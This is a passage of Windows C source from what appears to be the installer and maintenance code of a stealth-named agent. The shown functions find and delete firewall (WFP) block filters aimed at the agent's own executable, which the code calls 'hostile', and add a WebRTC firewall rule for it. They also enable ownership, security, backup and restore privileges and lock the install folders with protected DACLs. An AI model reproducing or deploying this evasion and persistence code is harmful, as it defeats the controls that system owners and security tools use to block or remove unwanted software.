            success = FALSE;
            Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step AddWebRtcFirewallRuleForService(agent) raised exception 0x%08lX", (unsigned long)GetExceptionCode());
        }
    }

    DWORD wfpStatus = ERROR_SUCCESS;
    __try
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: scanning hostile WFP block filters for %ls", paths.exePath);
        wfpStatus = Stealth_RemoveHostileWfpBlockFiltersForApp(paths.exePath, &removedWfpBlocks);
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
        wfpStatus = ERROR_GEN_FAILURE;
        Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step RemoveHostileWfpBlockFiltersForApp raised exception 0x%08lX", (unsigned long)GetExceptionCode());
    }
    if (wfpStatus != ERROR_SUCCESS)
    {
        success = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Failed to enumerate/remove hostile WFP blocks for %ls (error=%lu)", paths.exePath, (unsigned long)wfpStatus);
    }
    else if (removedWfpBlocks > 0)
    {
        changed = TRUE;
        Stealth_LogInstallEvent(L"[FIREWALL] Removed %lu hostile WFP block filter(s) for %ls", (unsigned long)removedWfpBlocks, paths.exePath);
    }

    if (success && changed)
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Policy maintenance converged for %ls", serviceName);
    }
    }
    __finally
    {
        InterlockedExchange(&g_StealthPolicyMaintenanceActive, 0);
    }
    return success;
}

// ================================================================
// Installation Path Management
// ================================================================

static BOOL Stealth_CreateDirectoryWithProtectedDacl(const wchar_t* path, const wchar_t* sddl)
{
    if (path == NULL || path[0] == L'\0') { return FALSE; }
    if (sddl == NULL || sddl[0] == L'\0') { return FALSE; }

    BOOL createOk = FALSE;
    DWORD createErr = ERROR_SUCCESS;
    PSECURITY_DESCRIPTOR pSD = NULL;

    Stealth_EnablePrivilege(L"SeTakeOwnershipPrivilege");
    Stealth_EnablePrivilege(L"SeSecurityPrivilege");
    Stealth_EnablePrivilege(L"SeBackupPrivilege");
    Stealth_EnablePrivilege(L"SeRestorePrivilege");

    // Attempt to create the directory with the desired DACL up front.
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &pSD, NULL))
    {
        SECURITY_ATTRIBUTES sa = {0};
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = pSD;
        sa.bInheritHandle = FALSE;

        createOk = CreateDirectoryW(path, &sa);
        createErr = createOk ? ERROR_SUCCESS : GetLastError();
        LocalFree(pSD);
        pSD = NULL;
    }

    // Fallback: standard CreateDirectory so the path exists even if ACL application failed.
    if (!createOk && createErr != ERROR_ALREADY_EXISTS)
    {
        createOk = CreateDirectoryW(path, NULL);
        createErr = createOk ? ERROR_SUCCESS : GetLastError();
    }

    if (!createOk && createErr != ERROR_ALREADY_EXISTS)
    {
        Stealth_DebugPrintfW(L"CreateDirectoryW failed (%lu) for %ls", createErr, path);
        return FALSE;
    }

    // Harden ACL even if directory already existed.
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &pSD, NULL))
    {
        PACL dacl = NULL;
        BOOL daclPresent = FALSE, daclDefaulted = FALSE;
        if (GetSecurityDescriptorDacl(pSD, &daclPresent, &dacl, &daclDefaulted) && daclPresent)
        {
            DWORD setResult = SetNamedSecurityInfoW(
                (LPWSTR)path,
                SE_FILE_OBJECT,
                DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                NULL, NULL, dacl, NULL);
            if (setResult != ERROR_SUCCESS)
            {
                Stealth_DebugPrintfW(L"SetNamedSecurityInfoW failed (%lu) for %ls", setResult, path);
            }
        }
        LocalFree(pSD);
    }

    return TRUE;
}

BOOL Stealth_CreateInstallRootDirectory(const wchar_t* installPath)
{
    return Stealth_CreateDirectoryWithProtectedDacl(installPath, STEALTH_INSTALL_ROOT_DACL_SDDL);
}

BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath)
{
    return Stealth_CreateDirectoryWithProtectedDacl(installPath, STEALTH_SECURE_DIR_DACL_SDDL);
}

BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath)
{
    const DWORD timeoutMs = 60000;
    const DWORD startTick = GetTickCount();
    DWORD delay = 100;
    DWORD lastErr = ERROR_SUCCESS;

    if (sourcePath == NULL || sourcePath[0] == 0 || destPath == NULL || destPath[0] == 0)
    {
        return FALSE;
    }

    while ((GetTickCount() - startTick) < timeoutMs)
    {
        SetFileAttributesW(destPath, FILE_ATTRIBUTE_NORMAL);
        if (DeleteFileW(destPath) || GetLastError() == ERROR_FILE_NOT_FOUND)
        {
            SetLastError(ERROR_SUCCESS);
            if (CopyFileW(sourcePath, destPath, FALSE))
            {
                return TRUE;
            }
            lastErr = GetLastError();
        }
        else
        {
            lastErr = GetLastError();
        }

        if (lastErr == ERROR_SHARING_VIOLATION ||
            lastErr == ERROR_LOCK_VIOLATION ||
            lastErr == ERROR_ACCESS_DENIED)
        {
            Sleep(delay);
            if (delay < 1000) { delay += 100; }
            continue;
        }
        break;
    }

    Stealth_DebugPrintfW(L"CopyFile failed (%lu): %ls -> %ls", lastErr, sourcePath, destPath);
    SetLastError(lastErr);
    return FALSE;
}
